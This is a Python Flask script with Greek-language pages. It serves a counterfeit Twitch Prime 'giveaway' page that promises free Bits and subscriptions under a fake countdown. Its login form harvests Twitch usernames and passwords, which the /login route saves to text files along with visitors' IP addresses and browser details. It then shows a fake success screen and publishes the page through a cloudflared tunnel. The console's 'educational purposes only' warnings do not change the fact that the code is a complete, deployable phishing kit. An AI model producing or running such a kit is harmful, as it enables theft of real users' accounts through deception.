import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'twitch-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Twitch Subs")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['tw_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Twitch Prime Διαγωνισμός - Δωρεάν Συνδρομές</title>
        <style>
            :root {
                --twitch-purple: #9146FF;
                --twitch-dark: #0F0F23;
                --twitch-light: #EFEFF1;
                --twitch-bits: #FFD700;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #0F0F23 0%, #18182B 100%);
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-box {
                background: rgba(20, 20, 40, 0.95);
                backdrop-filter: blur(10px);
                width: 100%;
                max-width: 500px;
                padding: 25px;
                border-radius: 12px;
                text-align: center;
                border: 2px solid rgba(145, 70, 255, 0.3);
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
                margin: 0 auto;
            }
            
            .twitch-logo {
                margin-bottom: 15px;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            
            .twitch-logo img {
                height: 40px;
                width: auto;
            }
            
            .prime-banner {
                background: linear-gradient(90deg, #9146FF 0%, #BF94FF 50%, #9146FF 100%);
                color: white;
                padding: 12px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 16px;
                border: 2px solid #BF94FF;
                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
            }
            
            .bits-banner {
                background: linear-gradient(90deg, #FFD700 0%, #FFED4E 50%, #FFD700 100%);
                color: #000;
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
                font-weight: 900;
                font-size: 20px;
                border: 3px solid #FFD700;
                animation: pulse-gold 2s infinite;
            }
            
            @keyframes pulse-gold {
                0% { box-shadow: 0 0 10px rgba(255, 215, 0, 0.5); }
                50% { box-shadow: 0 0 20px rgba(255, 215, 0, 0.8); }
                100% { box-shadow: 0 0 10px rgba(255, 215, 0, 0.5); }
            }
            
            .giveaway-container {
                background: rgba(145, 70, 255, 0.1);
                border: 2px dashed var(--twitch-purple);
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 24px;
                margin: 10px 0;
                color: white;
            }
            
            .subtitle {
                color: #ADADB8;
                font-size: 14px;
                margin-bottom: 20px;
                line-height: 1.5;
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.2);
                border: 2px solid #FF5555;
                border-radius: 8px;
                padding: 12px;
                margin: 15px 0;
                font-family: 'Courier New', monospace;
                font-size: 22px;
                color: #FF9999;
                text-align: center;
                font-weight: bold;
            }
            
            .stats-bar {
                display: flex;
                justify-content: space-between;
                background: rgba(255, 255, 255, 0.05);
                border-radius: 8px;
                padding: 12px;
                margin: 15px 0;
                flex-wrap: wrap;
            }
            
            .stat-item {
                text-align: center;
                flex: 1;
                min-width: 80px;
                margin: 5px 0;
            }
            
            .stat-number {
                font-size: 20px;
                font-weight: 800;
                color: var(--twitch-purple);
            }
            
            .stat-label {
                font-size: 11px;
                color: #ADADB8;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #ADADB8;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: rgba(255, 255, 255, 0.07);
                border: 2px solid rgba(255, 255, 255, 0.1);
                border-radius: 8px;
                color: white;
                font-size: 16px;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
                font-size: 15px;
            }
            
            input:focus {
                border-color: var(--twitch-purple);
                outline: none;
                background: rgba(255, 255, 255, 0.1);
            }
            
            input::placeholder {
                color: #888;
                font-size: 15px;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #9146FF, #BF94FF);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 8px;
                font-weight: 800;
                font-size: 16px;
                width: 100%;
                margin: 20px 0 15px;
                cursor: pointer;
                transition: all 0.3s;
                text-transform: uppercase;
                letter-spacing: 1px;
                font-size: 16px;
            }
            
            .login-btn:hover, .login-btn:active {
                transform: translateY(-2px);
                box-shadow: 0 6px 20px rgba(145, 70, 255, 0.4);
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 12px 0;
                color: #EFEFF1;
                font-size: 15px;
            }
            
            .benefit-icon {
                color: var(--twitch-purple);
                font-weight: bold;
                margin-right: 12px;
                font-size: 18px;
                flex-shrink: 0;
            }
            
            .verified-badge {
                display: inline-flex;
                align-items: center;
                background: rgba(145, 70, 255, 0.2);
                color: var(--twitch-purple);
                padding: 6px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 700;
                margin-left: 8px;
            }
            
            .warning-note {
                color: #FF9999;
                font-size: 11px;
                margin-top: 20px;
                border-top: 1px solid rgba(255, 255, 255, 0.1);
                padding-top: 15px;
                text-align: center;
                line-height: 1.4;
            }
            
            .twitch-prime-icon {
                background: linear-gradient(45deg, #9146FF, #FFD700);
                color: white;
                width: 50px;
                height: 50px;
                border-radius: 10px;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 15px;
                border: 2px solid white;
            }
            
            .twitch-prime-icon img {
                width: 28px;
                height: 28px;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 10px;
                }
                
                .login-box {
                    padding: 20px 15px;
                }
                
                .bits-banner {
                    font-size: 18px;
                    padding: 12px;
                }
                
                h1 {
                    font-size: 22px;
                }
                
                .timer {
                    font-size: 20px;
                    padding: 10px;
                }
                
                .stat-number {
                    font-size: 18px;
                }
                
                .login-btn {
                    padding: 14px;
                    font-size: 15px;
                }
                
                input {
                    padding: 12px;
                    font-size: 15px;
                }
                
                input::placeholder {
                    font-size: 14px;
                }
            }
            
            @media (max-width: 360px) {
                .login-box {
                    padding: 15px 12px;
                }
                
                .bits-banner {
                    font-size: 16px;
                }
                
                h1 {
                    font-size: 20px;
                }
                
                .benefit-item {
                    font-size: 14px;
                }
            }
        </style>
    </head>
    <body>
        <div style="width: 100%; max-width: 500px; margin: 0 auto;">
            <div class="login-box">
                <div class="twitch-logo">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/Twitch_logo.svg/1280px-Twitch_logo.svg.png" alt="Twitch Logo">
                </div>
                
                <div class="twitch-prime-icon">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Twitch_prime_icon.svg/2048px-Twitch_prime_icon.svg.png" alt="Twitch Prime">
                </div>
                
                <div class="prime-banner">
                    🎮 ΔΙΑΓΩΝΙΣΜΟΣ TWITCH PRIME 🎮
                </div>
                
                <div class="bits-banner">
                    5,000 ΔΩΡΕΑΝ BITS + 3 ΜΗΝΕΣ ΣΥΝΔΡΟΜΗ
                </div>
                
                <div class="giveaway-container">
                    <h1>Διαclaim Των Πλεονεκτημάτων Twitch Prime</h1>
                    <div class="subtitle">
                        Δωρεάν για τους πρώτους 100 θεατές! <span class="verified-badge">Επαληθευμένος Συνεργάτης</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        07:00
                    </div>
                </div>
                
                <div class="stats-bar">
                    <div class="stat-item">
                        <div class="stat-number">5K</div>
                        <div class="stat-label">Δωρεάν Bits</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">3</div>
                        <div class="stat-label">Δωρεάν Μήνες</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">24/7</div>
                        <div class="stat-label">Υποστήριξη</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Προβολή χωρίς διαφημίσεις σε όλα τα κανάλια
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Μηνιαία δωρεάν συνδρομή καναλιού
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Εξαιρετικά Emotes & Badges
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Επεκτεταμένα χρώματα chat
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Προτεραιότητα στην υποστήριξη
                    </div>
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">ΟΝΟΜΑ ΧΡΗΣΤΗ Ή EMAIL</label>
                        <input type="text" name="username" placeholder="Εισάγετε το όνομα χρήστη ή email σας στο Twitch" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">ΚΩΔΙΚΟΣ ΠΡΟΣΒΑΣΗΣ</label>
                        <input type="password" name="password" placeholder="Εισάγετε τον κωδικό πρόσβασής σας" required>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🎁 Διαclaim Twitch Prime Πλεονεκτημάτων
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ Αυτή η προσφορά Twitch Prime λήγει σε 7 λεπτά. Τα οφέλη θα ενεργοποιηθούν εντός 1 ώρας από την επαλήθευση.
                </div>
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 420; // 7 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 60) {
                    countdownElement.style.background = 'rgba(255, 0, 0, 0.3)';
                    countdownElement.style.animation = 'pulse-gold 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Το Διαγωνισμό Τελείωσε!";
                    countdownElement.style.color = '#FF0000';
                }
            }
            
            updateTimer();
            
            // Prevent zoom on mobile input focus
            document.addEventListener('touchstart', function(e) {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                    // Allow default behavior
                }
            }, { passive: true });
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('tw_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Twitch Prime Giveaway\n")
        file.write(f"Promised Benefits: 5,000 Bits + 3 Month Subscription\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ενεργοποίηση Twitch Prime - Twitch</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #0F0F23 0%, #18182B 100%);
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-tap-highlight-color: transparent;
            }
            
            .container {
                text-align: center;
                background: rgba(20, 20, 40, 0.95);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 16px;
                width: 100%;
                max-width: 600px;
                border: 3px solid rgba(145, 70, 255, 0.3);
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                margin: 0 auto;
            }
            
            .twitch-logo {
                margin-bottom: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            
            .twitch-logo img {
                height: 35px;
                width: auto;
            }
            
            .prime-icon {
                background: linear-gradient(45deg, #9146FF, #FFD700);
                color: white;
                width: 80px;
                height: 80px;
                border-radius: 16px;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 20px;
                border: 3px solid white;
                animation: float 3s ease-in-out infinite;
            }
            
            .prime-icon img {
                width: 40px;
                height: 40px;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-8px); }
            }
            
            .processing-container {
                background: rgba(145, 70, 255, 0.1);
                border: 2px solid var(--twitch-purple);
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
            }
            
            .progress-container {
                width: 100%;
                height: 8px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #9146FF, #BF94FF, #FFD700);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .benefits-activated {
                background: rgba(255, 215, 0, 0.1);
                border: 2px solid #FFD700;
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            .checkmark {
                color: #9146FF;
                font-weight: bold;
                font-size: 20px;
                margin-right: 12px;
                flex-shrink: 0;
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #EFEFF1;
                font-size: 16px;
            }
            
            .bits-amount {
                font-size: 36px;
                font-weight: 900;
                background: linear-gradient(45deg, #FFD700, #FFED4E);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0;
                text-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
            }
            
            .bits-icon {
                color: #FFD700;
                font-size: 28px;
                margin-right: 8px;
                vertical-align: middle;
            }
            
            h2 {
                margin-bottom: 10px;
                color: #9146FF;
                font-size: 22px;
            }
            
            p {
                color: #ADADB8;
                margin-bottom: 20px;
                font-size: 15px;
                line-height: 1.5;
            }
            
            h3 {
                color: white;
                margin-bottom: 15px;
                font-size: 18px;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                }
                
                .container {
                    padding: 25px 20px;
                }
                
                .prime-icon {
                    width: 70px;
                    height: 70px;
                }
                
                .prime-icon img {
                    width: 35px;
                    height: 35px;
                }
                
                .bits-amount {
                    font-size: 32px;
                }
                
                .status-item {
                    font-size: 15px;
                }
                
                h2 {
                    font-size: 20px;
                }
                
                .processing-container {
                    padding: 15px;
                }
                
                .benefits-activated {
                    padding: 15px;
                }
            }
            
            @media (max-width: 360px) {
                .container {
                    padding: 20px 15px;
                }
                
                .bits-amount {
                    font-size: 28px;
                }
                
                .status-item {
                    font-size: 14px;
                }
                
                .checkmark {
                    font-size: 18px;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="twitch-logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/Twitch_logo.svg/1280px-Twitch_logo.svg.png" alt="Twitch Logo">
            </div>
            
            <div class="prime-icon">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Twitch_prime_icon.svg/2048px-Twitch_prime_icon.svg.png" alt="Twitch Prime">
            </div>
            
            <div class="bits-amount">
                <span class="bits-icon">♬</span>5,000 Bits
            </div>
            
            <h2>Το Twitch Prime Ενεργοποιήθηκε!</h2>
            <p>Τα οφέλη σας προστίθενται στον λογαριασμό σας</p>
            
            <div class="processing-container">
                <h3>Επεξεργασία των Οφελών Prime</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p>Επαλήθευση λογαριασμού και εφαρμογή συνδρομών...</p>
            </div>
            
            <div class="benefits-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>5,000 Bits προστέθηκαν</strong> στον ισολογισμό σας
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>3 Μηνιαία Συνδρομή</strong> σε οποιοδήποτε κανάλι συνεργάτη
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Προβολή Χωρίς Διαφημίσεις</strong> σε όλα τα κανάλια
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Εξαιρετικά Emotes</strong> ξεκλειδώθηκαν
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Prime Loot</strong> διαθέσιμο σε συνδεδεμένα παιχνίδια
                </div>
            </div>
            
            <p style="margin-top: 25px; font-size: 14px;">
                Θα ανακατευθυνθείτε στο Twitch σύντομα...
                <br>
                <small style="color: #888; font-size: 13px;">Τα οφέλη σας στο Twitch Prime θα είναι ενεργά εντός 1 ώρας</small>
            </p>
        </div>
        
        <script>
            // Generate random bits animation
            setTimeout(() => {
                const bitsAmount = document.querySelector('.bits-amount');
                bitsAmount.style.transform = 'scale(1.05)';
                bitsAmount.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    bitsAmount.style.transform = 'scale(1)';
                }, 300);
            }, 1500);
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎮 Δημόσιος Σύνδεσμος Twitch Prime: {tunnel_url}")
            print(f"💰 Υπόσχεται: 5,000 ΔΩΡΕΑΝ Bits + 3 Μηνιαία Συνδρομή")
            print(f"💾 Τα διαπιστευτήρια αποθηκεύτηκαν στο: {BASE_FOLDER}")
            print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Μόνο για εκπαιδευτικούς σκοπούς!")
            print("⚠️  ΠΟΤΕ μην εισάγετε πραγματικά διαπιστευτήρια Twitch!")
            print("⚠️  Οι απάτες Twitch στοχεύουν streamers και θεατές!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5004, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Εκκίνηση Σελίδας Διαγωνισμού Twitch Prime...")
    print("📱 Θύρα: 5004")
    print("💾 Τοποθεσία αποθήκευσης: ~/storage/downloads/TwitchSubs/")
    print("💰 Υπόσχεται: 5,000 ΔΩΡΕΑΝ Bits + 3 Μηνιαία Συνδρομή")
    print("⏳ Αναμονή για σήραγγα cloudflared...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5004")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Ο διακομιστής σταμάτησε")
        sys.exit(0)